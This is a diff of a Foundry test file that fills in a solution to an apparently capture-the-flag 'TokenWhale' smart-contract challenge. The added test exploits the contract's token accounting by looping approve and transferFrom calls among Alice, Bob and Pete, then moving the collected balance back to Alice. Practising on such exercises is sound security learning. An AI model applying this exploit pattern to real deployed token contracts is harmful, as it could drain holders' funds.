@@ -15,7 +15,7 @@ contract TokenWhaleTest is Test {
 
     function setUp() public {
         // Deploy contracts
-        tokenWhale = new TokenWhale(address(this));
+        tokenWhale = new TokenWhale(Alice);
         exploitContract = new ExploitContract(tokenWhale);
     }
 
@@ -23,7 +23,26 @@ contract TokenWhaleTest is Test {
     // Use vm.startPrank and vm.stopPrank to change between msg.sender
     function testExploit() public {
         // Put your solution here
+        uint256 balanceAlice = tokenWhale.balanceOf(Alice);
+        
+        
+        for (uint256 i = 0; i < 1000; i++) {
+            vm.startPrank(Alice);
+            tokenWhale.approve(Bob, balanceAlice);
+            vm.stopPrank();
+            
+            vm.startPrank(Bob);
+            tokenWhale.transferFrom(Alice, Pete, balanceAlice);
+            vm.stopPrank();
+        }
 
+        uint256 balancePete = tokenWhale.balanceOf(Pete);
+        console.log("Alice balance After Transfer From: ", balanceAlice);
+        console.log("Pete balance: ", balancePete);
+
+        vm.startPrank(Pete);
+        tokenWhale.transfer(Alice, balancePete);
+        vm.stopPrank();
         _checkSolved();
     }
 
